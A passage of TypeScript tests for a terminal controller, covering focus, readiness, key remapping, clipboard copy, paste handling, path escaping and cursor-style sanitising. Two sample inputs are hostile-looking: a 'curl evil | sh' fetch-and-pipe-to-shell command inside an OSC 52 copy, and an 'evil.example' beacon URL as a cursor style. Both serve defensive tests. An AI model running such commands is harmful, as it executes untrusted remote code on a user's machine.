    expect(decrst([25])).toBe(false);
    expect(controller.readScreen(50)).toEqual({ text: "$ git sta" });
    decset([2004]);
    expect(controller.readScreen(50).caret).toBeUndefined();
    decset([25]);
    expect(controller.readScreen(50).caret).toEqual({ line: 0, column: 7 });
    decrst([25]);
    expect(harness.softReset()).toBe(false);
    expect(controller.readScreen(50).caret).toBeDefined();
    decrst([25]);
    expect(harness.reset()).toBe(false);
    expect(controller.readScreen(50).caret).toBeDefined();

    controller.dispose();
  });

  it("tells a program setting up for input while focus reporting is on, as under ConPTY", async () => {
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-focus-report-conpty",
        cwd: "/workspace",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const decset = harness.getAltEnterHandler();
    if (!decset) throw new Error("no DECSET handler");

    harness.setFocusReporting(true);
    expect(decset([2026])).toBe(false);
    await afterFocusReportDelay();
    expect(harness.ptyWrites).toEqual([]);

    expect(decset([2004])).toBe(false);
    expect(decset([2004])).toBe(false);
    await afterFocusReportDelay();
    expect(harness.ptyWrites).toEqual(["\x1b[O"]);

    controller.dispose();
  });
});

describe("services/terminal controller focus asked for before xterm opens", () => {
  beforeEach(() => resetIpc());

  function lateTerminal(tabId: string) {
    const harness = makeTerminalControllerDeps();
    let loaded = () => {};
    harness.deps.waitForTerminalFonts = () =>
      new Promise<void>((resolve) => {
        loaded = resolve;
      });
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId,
        cwd: "/workspace",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    return { harness, controller, loaded: () => loaded() };
  }

  const opened = () => new Promise((resolve) => setTimeout(resolve, 0));

  it("focuses it once it opens", async () => {
    const { harness, controller, loaded } = lateTerminal("tab-focus-late");
    controller.focus();
    loaded();
    await opened();
    expect(harness.getFocusCalls()).toBe(1);
    controller.dispose();
  });

  it("asks what wanted the focus whether it still does, as it opens", async () => {
    const { harness, controller, loaded } = lateTerminal("tab-focus-late-typing");
    let still = true;
    controller.focus(() => still);
    still = false;
    loaded();
    await opened();
    expect(harness.getFocusCalls()).toBe(0);
    controller.dispose();
  });
});

describe("services/terminal lazy ligatures", () => {
  const opened = () => new Promise((resolve) => setTimeout(resolve, 0));
  const options = {
    workspaceId: WS,
    tabId: "tab-ligatures",
    cwd: "/workspace",
    container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
    autoSpawn: false,
  };

  afterEach(() => useTerminalStore.setState({ fontLigatures: undefined }));

  it("opens after the first load and activates the addon after xterm opens", async () => {
    useTerminalStore.setState({ fontLigatures: true });
    const { deps } = makeTerminalControllerDeps();
    const loaded = Promise.withResolvers<Awaited<ReturnType<typeof deps.loadLigaturesAddon>>>();
    deps.loadLigaturesAddon = mock(() => loaded.promise);
    const createTerminal = deps.createTerminal;
    const open = mock(() => {});
    const addon = { dispose: mock(() => {}) };
    deps.createTerminal = (options) => ({
      ...createTerminal(options),
      open,
      loadAddon: (next) => {
        if (next === addon) expect(open).toHaveBeenCalledTimes(1);
      },
    });

    const controller = createTerminalController(options, deps);
    try {
      expect(deps.loadLigaturesAddon).toHaveBeenCalledTimes(1);
      expect(open).not.toHaveBeenCalled();
      loaded.resolve(() => addon);
      await opened();
      expect(open).toHaveBeenCalledTimes(1);
    } finally {
      controller.dispose();
    }
    expect(addon.dispose).toHaveBeenCalledTimes(1);
  });

  it("skips disabled ligatures and ignores a load that finishes after disabling or closing", async () => {
    const { deps } = makeTerminalControllerDeps();
    const loaded = Promise.withResolvers<Awaited<ReturnType<typeof deps.loadLigaturesAddon>>>();
    const createAddon = mock(() => ({ dispose: () => {} }));
    deps.loadLigaturesAddon = mock(() => loaded.promise);

    const controller = createTerminalController(options, deps);
    try {
      await opened();
      expect(deps.loadLigaturesAddon).not.toHaveBeenCalled();
      useTerminalStore.setState({ fontLigatures: true });
      controller.applyTerminalSettings();
      expect(deps.loadLigaturesAddon).toHaveBeenCalledTimes(1);
      useTerminalStore.setState({ fontLigatures: false });
      controller.applyTerminalSettings();
      loaded.resolve(createAddon);
      await opened();
      expect(createAddon).not.toHaveBeenCalled();

      useTerminalStore.setState({ fontLigatures: true });
      controller.applyTerminalSettings();
      controller.dispose();
      await opened();
      expect(createAddon).not.toHaveBeenCalled();
    } finally {
      controller.dispose();
    }
  });
});

describe("services/terminal controller ready for input", () => {
  beforeEach(resetIpc);
  afterEach(() => jest.useRealTimers());

  function terminal(tabId: string, spawned?: { pid: number } | null) {
    const harness = makeTerminalControllerDeps(() => Promise.resolve(spawned ?? null));
    let loaded = () => {};
    harness.deps.waitForTerminalFonts = () =>
      new Promise<void>((resolve) => {
        loaded = resolve;
      });
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId,
        cwd: "/workspace",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
        ...(spawned === undefined ? { autoSpawn: false } : {}),
      },
      harness.deps,
    );
    return { harness, controller, loaded: () => loaded() };
  }

  it("not before it opens; then at once, with no shell to wait for", async () => {
    const { controller, loaded } = terminal("tab-ready-ended");
    expect(controller.input("x", "keys")).toBe(false);
    const ready = controller.whenReady(1000);
    loaded();
    expect(await ready).toBe(true);
    expect(await controller.whenReady(0)).toBe(true);
    expect(controller.input("x", "keys")).toBe(true);
    controller.dispose();
    expect(await controller.whenReady(1000)).toBe(false);
  });

  it("tells a wait no once it is gone, or after it", async () => {
    jest.useFakeTimers();
    const gone = terminal("tab-ready-gone");
    const waiting = gone.controller.whenReady(1000);
    gone.controller.dispose();
    expect(await waiting).toBe(false);
    const slow = terminal("tab-ready-slow");
    const timedOut = slow.controller.whenReady(5);
    jest.advanceTimersByTime(5);
    expect(await timedOut).toBe(false);
    slow.controller.dispose();
  });

  it("a shell just started: once it has printed its prompt and gone quiet", async () => {
    jest.useFakeTimers();
    const { harness, controller, loaded } = terminal("tab-ready-shell", { pid: 7 });
    let ready: boolean | undefined;
    const waiting = controller.whenReady(3000).then((answer) => {
      ready = answer;
      return answer;
    });
    loaded();
    await flushTerminalInit();
    jest.advanceTimersByTime(20);
    await Promise.resolve();
    expect(ready).toBeUndefined();
    harness.getPtyOptions()?.onData("PS C:\\> ", false);
    jest.advanceTimersByTime(STARTUP_INPUT_QUIET_MS - 1);
    await Promise.resolve();
    expect(ready).toBeUndefined();
    jest.advanceTimersByTime(1);
    expect(await waiting).toBe(true);
    controller.dispose();
  });

  it("a session that comes back with its output replayed: once that has been written", async () => {
    const { harness, controller, loaded } = terminal("tab-ready-replayed", { pid: 8 });
    loaded();
    await flushTerminalInit();
    harness.getPtyOptions()?.onData("PS C:\\> ", true);
    expect(await controller.whenReady(1000)).toBe(true);
    controller.dispose();
  });

  it("a session already running: at once", async () => {
    const { controller, loaded } = terminal("tab-ready-running", null);
    loaded();
    await flushTerminalInit();
    expect(await controller.whenReady(0)).toBe(true);
    controller.dispose();
  });
});

describe("services/terminal controller input tracking", () => {
  beforeEach(resetIpc);

  it("tracks browser input and leaves its checkpoint alone for PTY output and xterm replies", async () => {
    const harness = makeTerminalControllerDeps();
    const container = Object.assign(new EventTarget(), { clientWidth: 800, clientHeight: 480 });
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-input-checkpoint",
        cwd: "/workspace",
        container: container as unknown as HTMLElement,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const initial = controller.getInputCheckpoint();
    const listener = mock(() => {});
    const unsubscribe = controller.onInput(listener);

    try {
      harness.getPtyOptions()?.onData("shell prompt", false);
      harness.getPtyOptions()?.onData("\x1b[6n", false);
      harness.termData("\x1b[3;1R");
      expect(controller.getInputCheckpoint()).toBe(initial);
      expect(listener).not.toHaveBeenCalled();

      container.dispatchEvent(Object.assign(new Event("keydown"), { key: "e" }));
      const typed = controller.getInputCheckpoint();
      expect(typed).not.toBe(initial);
      expect(typed.hasInput).toBe(true);
      expect(listener).toHaveBeenCalledTimes(1);

      container.dispatchEvent(new Event("paste"));
      expect(controller.getInputCheckpoint()).not.toBe(typed);
      expect(listener).toHaveBeenCalledTimes(2);
    } finally {
      unsubscribe();
      controller.dispose();
    }
    const disposed = controller.getInputCheckpoint();
    container.dispatchEvent(Object.assign(new Event("keydown"), { key: "x" }));
    expect(controller.getInputCheckpoint()).toBe(disposed);
  });

  it("keeps a shell draft typed before the view notices the agent exit", async () => {
    const harness = makeTerminalControllerDeps();
    const terminal = { workspaceId: WS, tabId: "tab-exit-input-gap" };
    const container = Object.assign(new EventTarget(), { clientWidth: 800, clientHeight: 480 });
    const controller = createTerminalController(
      { ...terminal, cwd: "/workspace", container: container as unknown as HTMLElement },
      harness.deps,
    );
    await flushTerminalInit();
    const unregister = registerTerminalController(terminal.tabId, controller);
    let checkpoint: TerminalInputCheckpoint | undefined;
    const stop = watchAgentInput(terminal, controller, "codex", (input) => {
      checkpoint = input;
    });
    const type = (key: string) => {
      container.dispatchEvent(Object.assign(new Event("keydown"), { key }));
      harness.termData(key);
    };

    try {
      mockForegroundProcessName = "codex";
      type("a");
      await flushTerminalInit();
      const whileRunning = controller.getInputCheckpoint();
      expect(checkpoint).toBe(whileRunning);

      mockForegroundProcessName = "zsh";
      type("e");
      await flushTerminalInit();
      expect(checkpoint).toBe(whileRunning);

      await resumeInTerminal(terminal, "codex resume", checkpoint);
      expect(harness.ptyWrites).toEqual(["a", "e"]);
    } finally {
      stop();
      unregister();
      controller.dispose();
      mockForegroundProcessName = "lazygit";
    }
  });
});

describe("services/terminal controller replay", () => {
  beforeEach(resetIpc);

  it("keeps xterm's answers to replayed output from reaching the program", async () => {
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-replay-answers",
        cwd: "/workspace",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const options = harness.getPtyOptions();
    if (!options) throw new Error("pty client not created");

    options.onData("\x1b[6n", true);
    harness.termData("\x1b[12;1R");
    expect(harness.ptyWrites).toEqual([]);

    harness.parseWrites();
    options.onData("\x1b[6n", false);
    harness.termData("\x1b[3;1R");
    expect(harness.ptyWrites).toEqual(["\x1b[3;1R"]);
    expect(harness.writes).toEqual(["\x1b[6n", "\x1b[6n"]);

    controller.dispose();
  });
});

describe("services/terminal controller reopen", () => {
  beforeEach(resetIpc);

  it("changes the sandbox consent scope when the shell reopens", async () => {
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-reopen-sandbox",
        cwd: "/workspace/original",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();

    const session = controller.sandboxSession;
    await controller.reopen();
    expect(controller.sandboxSession).not.toBe(session);
    controller.dispose();
    expect(controller.sandboxSession).toBeNull();
  });

  it("surfaces reopen spawn failure so the view can swap to retry copy", async () => {
    const harness = makeTerminalControllerDeps(() => Promise.reject(new Error("agent down")));
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-reopen-fails",
        cwd: "/workspace/original",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();

    await expect(controller.reopen()).rejects.toThrow("agent down");
    expect(harness.writes).toEqual([]);

    controller.dispose();
  });

  it("treats spawn=null (already live) as a no-op so the view does not show failed copy", async () => {
    const harness = makeTerminalControllerDeps(() => Promise.resolve(null));
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-reopen-already-live",
        cwd: "/workspace/original",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();

    await expect(controller.reopen()).resolves.toBeUndefined();
    expect(harness.writes).toEqual([]);

    controller.dispose();
  });
});

describe("services/terminal controller — 라인 단축키 치환", () => {
  beforeEach(() => {
    resetStores();
    resetIpc();
  });

  async function setupHandler(tabId = "tab-keymap") {
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const handler = harness.getKeyHandler();
    if (!handler) throw new Error("customKey handler was not registered");
    return { harness, controller, handler };
  }

  interface FakeKeyEvent {
    type: string;
    key: string;
    shiftKey?: boolean;
    metaKey?: boolean;
    ctrlKey?: boolean;
    altKey?: boolean;
    repeat?: boolean;
    isComposing?: boolean;
    keyCode?: number;
    defaultPrevented: boolean;
    preventDefault(): void;
    stopPropagation(): void;
  }
  function fakeKeyEvent(opts: {
    type?: string;
    key: string;
    shiftKey?: boolean;
    metaKey?: boolean;
    ctrlKey?: boolean;
    altKey?: boolean;
    repeat?: boolean;
    isComposing?: boolean;
    keyCode?: number;
  }): FakeKeyEvent {
    const event: FakeKeyEvent = {
      type: opts.type ?? "keydown",
      key: opts.key,
      shiftKey: opts.shiftKey,
      metaKey: opts.metaKey,
      ctrlKey: opts.ctrlKey,
      altKey: opts.altKey,
      repeat: opts.repeat,
      isComposing: opts.isComposing,
      keyCode: opts.keyCode,
      defaultPrevented: false,
      preventDefault() {
        this.defaultPrevented = true;
      },
      stopPropagation() {},
    };
    return event;
  }

  it("reopens an ended terminal on Enter and consumes held repeats through reopening", async () => {
    const tab = useTabsStore.getState().createTab(WS, {
      type: "terminal",
      props: { cwd: "/workspace" },
    });
    const { controller, handler } = await setupHandler(tab.id);
    const requested = mock(() => {});
    const unsubscribe = subscribeTerminalReopenRequest(WS, tab.id, requested);
    const press = (opts: Partial<Parameters<typeof fakeKeyEvent>[0]> = {}) => {
      const event = fakeKeyEvent({ key: "Enter", ...opts });
      return { passed: handler(event as unknown as KeyboardEvent), event };
    };
    try {
      expect(press().passed).toBe(true);
      expect(requested).not.toHaveBeenCalled();

      useTabsStore.getState().setTerminalDead(WS, tab.id, true);
      expect(press({ isComposing: true }).passed).toBe(true);
      expect(press({ ctrlKey: true }).passed).toBe(true);
      expect(requested).not.toHaveBeenCalled();
      const { passed, event } = press();
      expect(passed).toBe(false);
      expect(event.defaultPrevented).toBe(true);
      expect(requested).toHaveBeenCalledTimes(1);
      expect(press({ repeat: true }).passed).toBe(false);
      expect(requested).toHaveBeenCalledTimes(1);

      useTabsStore.getState().setTerminalDead(WS, tab.id, false);
      expect(press({ repeat: true }).passed).toBe(false);
      expect(press().passed).toBe(true);
      expect(press({ repeat: true }).passed).toBe(true);
      expect(requested).toHaveBeenCalledTimes(1);
    } finally {
      unsubscribe();
      controller.dispose();
    }
  });

  it("조합 중 bare Cmd(Meta) keydown → return false (xterm 조기 finalize 차단, preventDefault 안 함)", async () => {
    const { harness, controller, handler } = await setupHandler();
    const event = fakeKeyEvent({ key: "Meta", metaKey: true, isComposing: true, keyCode: 91 });

    const result = handler(event as unknown as KeyboardEvent);

    expect(result).toBe(false);
    expect(event.defaultPrevented).toBe(false);
    await new Promise((r) => setTimeout(r, 0));
    expect(harness.ptyWrites).toEqual([]);

    controller.dispose();
  });

  it("조합 중 Cmd+ArrowRight(=isComposing 상태) → xterm에 위임(return true), 직접 write 안 함", async () => {
    const { harness, controller, handler } = await setupHandler();
    const event = fakeKeyEvent({
      key: "ArrowRight",
      metaKey: true,
      isComposing: true,
      keyCode: 229,
    });

    const result = handler(event as unknown as KeyboardEvent);

    expect(result).toBe(true);
    await new Promise((r) => setTimeout(r, 0));
    expect(harness.ptyWrites).toEqual([]);

    controller.dispose();
  });

  it("Home 단독 keydown → \\x01 송신 + 기본 동작 차단", async () => {
    const { harness, controller, handler } = await setupHandler();
    const event = fakeKeyEvent({ key: "Home" });

    const result = handler(event as unknown as KeyboardEvent);

    expect(result).toBe(false);
    expect(event.defaultPrevented).toBe(true);
    await new Promise((r) => setTimeout(r, 0));
    expect(harness.ptyWrites).toEqual(["\x01"]);

    controller.dispose();
  });

  it("End 단독 keydown → \\x05 송신 + 기본 동작 차단", async () => {
    const { harness, controller, handler } = await setupHandler();
    const event = fakeKeyEvent({ key: "End" });

    const result = handler(event as unknown as KeyboardEvent);

    expect(result).toBe(false);
    expect(event.defaultPrevented).toBe(true);
    await new Promise((r) => setTimeout(r, 0));
    expect(harness.ptyWrites).toEqual(["\x05"]);

    controller.dispose();
  });

  it("Cmd+ArrowLeft (macOS 내장 키보드 line-begin) → \\x01 송신", async () => {
    const { harness, controller, handler } = await setupHandler();
    const event = fakeKeyEvent({ key: "ArrowLeft", metaKey: true });

    const result = handler(event as unknown as KeyboardEvent);

    expect(result).toBe(false);
    expect(event.defaultPrevented).toBe(true);
    await new Promise((r) => setTimeout(r, 0));
    expect(harness.ptyWrites).toEqual(["\x01"]);

    controller.dispose();
  });

  it("Cmd+ArrowRight (macOS 내장 키보드 line-end) → \\x05 송신", async () => {
    const { harness, controller, handler } = await setupHandler();
    const event = fakeKeyEvent({ key: "ArrowRight", metaKey: true });

    const result = handler(event as unknown as KeyboardEvent);

    expect(result).toBe(false);
    expect(event.defaultPrevented).toBe(true);
    await new Promise((r) => setTimeout(r, 0));
    expect(harness.ptyWrites).toEqual(["\x05"]);

    controller.dispose();
  });

  it("modifier 동반 Home/End / 추가 modifier 동반 Cmd+arrow는 통과", async () => {
    const { harness, controller, handler } = await setupHandler();

    expect(handler(fakeKeyEvent({ key: "Home", shiftKey: true }) as unknown as KeyboardEvent)).toBe(
      true,
    );
    expect(handler(fakeKeyEvent({ key: "End", metaKey: true }) as unknown as KeyboardEvent)).toBe(
      true,
    );
    expect(handler(fakeKeyEvent({ key: "Home", ctrlKey: true }) as unknown as KeyboardEvent)).toBe(
      true,
    );
    expect(handler(fakeKeyEvent({ key: "End", altKey: true }) as unknown as KeyboardEvent)).toBe(
      true,
    );
    expect(
      handler(
        fakeKeyEvent({
          key: "ArrowLeft",
          metaKey: true,
          shiftKey: true,
        }) as unknown as KeyboardEvent,
      ),
    ).toBe(true);
    expect(
      handler(fakeKeyEvent({ key: "ArrowRight", altKey: true }) as unknown as KeyboardEvent),
    ).toBe(true);
    expect(handler(fakeKeyEvent({ key: "ArrowLeft" }) as unknown as KeyboardEvent)).toBe(true);
    expect(handler(fakeKeyEvent({ key: "ArrowRight" }) as unknown as KeyboardEvent)).toBe(true);

    expect(harness.ptyWrites).toEqual([]);

    controller.dispose();
  });

  it("keyup은 통과 — keydown만 인터셉트", async () => {
    const { harness, controller, handler } = await setupHandler();

    expect(handler(fakeKeyEvent({ type: "keyup", key: "Home" }) as unknown as KeyboardEvent)).toBe(
      true,
    );
    expect(harness.ptyWrites).toEqual([]);

    controller.dispose();
  });

  it("leaves Home and End to PowerShell and cmd", async () => {
    for (const shellPath of [
      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "C:\\Windows\\system32\\cmd.exe",
    ]) {
      const harness = makeTerminalControllerDeps(() => Promise.resolve({ pid: 1, shellPath }));
      const controller = createTerminalController(
        {
          workspaceId: WS,
          tabId: `tab-${shellPath.length}`,
          cwd: "C:\\work",
          container: {} as HTMLElement,
        },
        harness.deps,
      );
      await flushTerminalInit();
      await new Promise((r) => setTimeout(r, 0));
      const handler = harness.getKeyHandler();
      if (!handler) throw new Error("customKey handler was not registered");

      for (const key of ["Home", "End"]) {
        const event = fakeKeyEvent({ key });
        expect(handler(event as unknown as KeyboardEvent)).toBe(true);
        expect(event.defaultPrevented).toBe(false);
      }
      await new Promise((r) => setTimeout(r, 0));
      expect(harness.ptyWrites).toEqual([]);

      controller.dispose();
    }
  });

  describe("a program's OSC 52 copy", () => {
    const copied = () =>
      ipcCalls
        .filter((c) => c.channel === "clipboard" && c.method === "writeText")
        .map((c) => c.args);
    const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");
    const doc = document as unknown as { hasFocus: () => boolean; activeElement: unknown };

    it("goes on the clipboard only while the user types in that terminal", async () => {
      const { harness, controller } = await setupHandler();
      const before = copied().length;
      harness.osc(52, `c;${b64("curl evil | sh")}`);
      harness.osc(1337, `Copy=:${b64("curl evil | sh")}`);
      await new Promise((r) => setTimeout(r, 0));
      expect(copied().length).toBe(before);
      const { hasFocus, activeElement } = doc;
      try {
        doc.hasFocus = () => true;
        doc.activeElement = harness.textarea;
        harness.osc(52, `c;${b64("저장 ✓")}`);
        harness.osc(1337, `Copy=:${b64("npm test")}`);
        harness.osc(52, "c;?");
      } finally {
        doc.hasFocus = hasFocus;
        doc.activeElement = activeElement;
      }
      await new Promise((r) => setTimeout(r, 0));
      expect(copied().slice(before)).toEqual([{ text: "저장 ✓" }, { text: "npm test" }]);
      controller.dispose();
    });
  });

  describe("copy with a selection", () => {
    const copied = () =>
      ipcCalls
        .filter((c) => c.channel === "clipboard" && c.method === "writeText")
        .map((c) => c.args);

    it("Ctrl+C copies, then drops the selection so the next Ctrl+C goes to the app", async () => {
      const { harness, controller, handler } = await setupHandler();
      harness.setSelection("hello");

      const first = fakeKeyEvent({ key: "c", ctrlKey: true, keyCode: 67 });
      expect(handler(first as unknown as KeyboardEvent)).toBe(false);
      expect(first.defaultPrevented).toBe(true);
      expect(harness.getSelection()).toBe("");
      await new Promise((r) => setTimeout(r, 0));
      expect(copied()).toEqual([{ text: "hello" }]);

      expect(
        handler(fakeKeyEvent({ key: "c", ctrlKey: true, keyCode: 67 }) as unknown as KeyboardEvent),
      ).toBe(true);

      controller.dispose();
    });

    it("Cmd+C copies and keeps the selection", async () => {
      const { harness, controller, handler } = await setupHandler();
      harness.setSelection("hello");

      expect(
        handler(fakeKeyEvent({ key: "c", metaKey: true, keyCode: 67 }) as unknown as KeyboardEvent),
      ).toBe(false);
      expect(harness.getSelection()).toBe("hello");
      await new Promise((r) => setTimeout(r, 0));
      expect(copied()).toEqual([{ text: "hello" }]);

      controller.dispose();
    });
  });

  describe("Ctrl+V", () => {
    const host = globalThis.window as unknown as { host?: { platform: string } };
    afterEach(() => {
      delete host.host;
    });
    const ctrlV = (extra: { shiftKey?: boolean; altKey?: boolean } = {}) =>
      fakeKeyEvent({ key: "v", ctrlKey: true, keyCode: 86, ...extra });

    it("leaves the key to Chromium's paste on Windows when the app wants bracketed paste", async () => {
      host.host = { platform: "win32" };
      const { harness, controller, handler } = await setupHandler();
      harness.setBracketedPaste(true);
      const event = ctrlV();

      expect(handler(event as unknown as KeyboardEvent)).toBe(false);
      expect(event.defaultPrevented).toBe(false);
      expect(harness.ptyWrites).toEqual([]);

      controller.dispose();
    });

    const shellTerminal = async (shellPath: string | undefined, tabId: string) => {
      const listeners: ((event: unknown) => void)[] = [];
      const container = {
        addEventListener: (type: string, listener: (event: unknown) => void) => {
          if (type === "paste") listeners.push(listener);
        },
        removeEventListener: () => {},
      } as unknown as HTMLElement;
      const harness = makeTerminalControllerDeps(() => Promise.resolve({ pid: 1, shellPath }));
      const controller = createTerminalController(
        { workspaceId: WS, tabId, cwd: "C:\\work", container },
        harness.deps,
      );
      await flushTerminalInit();
      await new Promise((r) => setTimeout(r, 0));
      const handler = harness.getKeyHandler();
      if (!handler) throw new Error("customKey handler was not registered");
      const paste = (text: string) => {
        const event = {
          defaultPrevented: false,
          clipboardData: { getData: (type: string) => (type === "text/plain" ? text : "") },
          preventDefault() {
            this.defaultPrevented = true;
          },
          stopPropagation() {},
        };
        for (const listener of listeners) listener(event);
        return event;
      };
      return { harness, controller, handler, paste };
    };
    const POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

    it("pastes into a program without bracketed paste, in any other shell", async () => {
      host.host = { platform: "win32" };
      const shells = ["C:\\Windows\\system32\\CMD.EXE", "C:\\Program Files\\Git\\bin\\bash.exe"];
      for (const [i, shellPath] of [...shells, undefined].entries()) {
        const { harness, controller, handler, paste } = await shellTerminal(shellPath, `tab-${i}`);
        const event = ctrlV();

        expect(handler(event as unknown as KeyboardEvent)).toBe(false);
        expect(event.defaultPrevented).toBe(false);
        expect(paste("code#state").defaultPrevented).toBe(false);
        expect(harness.ptyWrites).toEqual([]);

        controller.dispose();
      }
    });

    it("sends ^V to PowerShell at its prompt, which pastes it itself", async () => {
      host.host = { platform: "win32" };
      mockForegroundProcessName = "powershell";
      const { harness, controller, handler, paste } = await shellTerminal(POWERSHELL, "tab-ps");

      expect(handler(ctrlV() as unknown as KeyboardEvent)).toBe(false);
      expect(paste("line 1\r\nline 2").defaultPrevented).toBe(true);
      await new Promise((r) => setTimeout(r, 0));

      expect(harness.ptyWrites).toEqual(["\x16"]);
      expect(harness.pastes).toEqual([]);
      controller.dispose();
      mockForegroundProcessName = "lazygit";
    });

    it("pastes the text into a program PowerShell runs, such as ssh", async () => {
      host.host = { platform: "win32" };
      mockForegroundProcessName = "ssh";
      const { harness, controller, handler, paste } = await shellTerminal(POWERSHELL, "tab-ssh");

      expect(handler(ctrlV() as unknown as KeyboardEvent)).toBe(false);
      expect(paste("code#state").defaultPrevented).toBe(true);
      await new Promise((r) => setTimeout(r, 0));

      expect(harness.pastes).toEqual(["code#state"]);
      expect(harness.ptyWrites).toEqual([]);
      controller.dispose();
      mockForegroundProcessName = "lazygit";
    });

    it("holds only the paste of the Ctrl+V just pressed in PowerShell", async () => {
      host.host = { platform: "win32" };
      const { harness, controller, handler, paste } = await shellTerminal(POWERSHELL, "tab-later");

      handler(ctrlV() as unknown as KeyboardEvent);
      await new Promise((r) => setTimeout(r, 0));
      expect(paste("later").defaultPrevented).toBe(false);

      harness.setBracketedPaste(true);
      handler(ctrlV() as unknown as KeyboardEvent);
      expect(paste("bracketed").defaultPrevented).toBe(false);

      await new Promise((r) => setTimeout(r, 0));
      expect(harness.ptyWrites).toEqual([]);
      expect(harness.pastes).toEqual([]);
      controller.dispose();
    });

    it("still sends ^V on Linux and macOS", async () => {
      for (const platform of ["linux", "darwin"]) {
        host.host = { platform };
        const { harness, controller, handler } = await setupHandler();
        harness.setBracketedPaste(true);

        expect(handler(ctrlV() as unknown as KeyboardEvent)).toBe(true);

        controller.dispose();
      }
    });

    it("leaves Ctrl+Shift+V and Ctrl+Alt+V to xterm", async () => {
      host.host = { platform: "win32" };
      const { harness, controller, handler } = await setupHandler();
      harness.setBracketedPaste(true);

      expect(handler(ctrlV({ shiftKey: true }) as unknown as KeyboardEvent)).toBe(true);
      expect(handler(ctrlV({ altKey: true }) as unknown as KeyboardEvent)).toBe(true);

      controller.dispose();
    });
  });
});

describe("escapeDroppedPath", () => {
  it("backslash-escapes for a POSIX or remote shell, leaving Unicode letters", () => {
    expect(escapeDroppedPath("/Users/me/my file (1).png")).toBe(
      "/Users/me/my\\ file\\ \\(1\\).png",
    );
    expect(escapeDroppedPath("/tmp/한글 파일.txt", "/bin/zsh")).toBe("/tmp/한글\\ 파일.txt");
    expect(escapeDroppedPath("/tmp/plain.txt", "/bin/bash")).toBe("/tmp/plain.txt");
  });

  it("single-quotes for PowerShell, doubling quotes in the name", () => {
    const pwsh = "C:\\Program Files\\PowerShell\\7\\pwsh.exe";
    expect(escapeDroppedPath("C:\\Users\\me\\my file.png", pwsh)).toBe(
      "'C:\\Users\\me\\my file.png'",
    );
    expect(escapeDroppedPath("C:\\x\\it's $5.txt", "powershell.exe")).toBe("'C:\\x\\it''s $5.txt'");
    expect(escapeDroppedPath("C:\\x\\plain.txt", pwsh)).toBe("C:\\x\\plain.txt");
  });

  it("double-quotes for cmd.exe", () => {
    const cmd = "C:\\Windows\\System32\\cmd.exe";
    expect(escapeDroppedPath("C:\\Users\\me\\a & b.txt", cmd)).toBe('"C:\\Users\\me\\a & b.txt"');
    expect(escapeDroppedPath("C:\\x\\plain.txt", cmd)).toBe("C:\\x\\plain.txt");
  });
});

describe("oscCursorStyle", () => {
  it("passes CSS cursor keywords through", () => {
    expect(oscCursorStyle("pointer")).toBe("pointer");
    expect(oscCursorStyle("Text")).toBe("text");
    expect(oscCursorStyle("")).toBe("");
  });

  it("resets anything that is not a plain keyword", () => {
    expect(oscCursorStyle("url(https://evil.example/beacon), auto")).toBe("");
    expect(oscCursorStyle("image-set(url(x.png) 1x), pointer")).toBe("");
    expect(oscCursorStyle("left_ptr")).toBe("");
  });
});

describe("isShellPromptLikeTitle", () => {
  it("path / cwd 포함 → prompt-like로 판정", () => {
    expect(isShellPromptLikeTitle("kih@MacBookPro:~/workspaces/project")).toBe(true);
    expect(isShellPromptLikeTitle("/Users/kih/path")).toBe(true);
    expect(isShellPromptLikeTitle("~/path")).toBe(true);
    expect(isShellPromptLikeTitle("user@host:/abs/path")).toBe(true);
  });

  it("TUI 단일 단어 → 통과", () => {
    expect(isShellPromptLikeTitle("lazygit")).toBe(false);
    expect(isShellPromptLikeTitle("claude")).toBe(false);
    expect(isShellPromptLikeTitle("lazydocker")).toBe(false);
    expect(isShellPromptLikeTitle("less")).toBe(false);
    expect(isShellPromptLikeTitle("vim README.md")).toBe(false);
  });

  it("the titles cmd and PowerShell give the console: their own path", () => {
    expect(isShellPromptLikeTitle("C:\\WINDOWS\\system32\\cmd.exe")).toBe(true);
    expect(isShellPromptLikeTitle("C:\\WINDOWS\\system32\\cmd.exe - ping -n 100 127.0.0.1")).toBe(
      true,
    );
    expect(
      isShellPromptLikeTitle("C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
    ).toBe(true);
  });

  it("@만 있고 : 없음 → 통과 (이메일 등 비-prompt 가능)", () => {
    expect(isShellPromptLikeTitle("@anthropic")).toBe(false);
  });

  it("빈 문자열 → 통과 (store가 clear로 해석)", () => {
    expect(isShellPromptLikeTitle("")).toBe(false);
  });
});

describe("isLoginShell", () => {
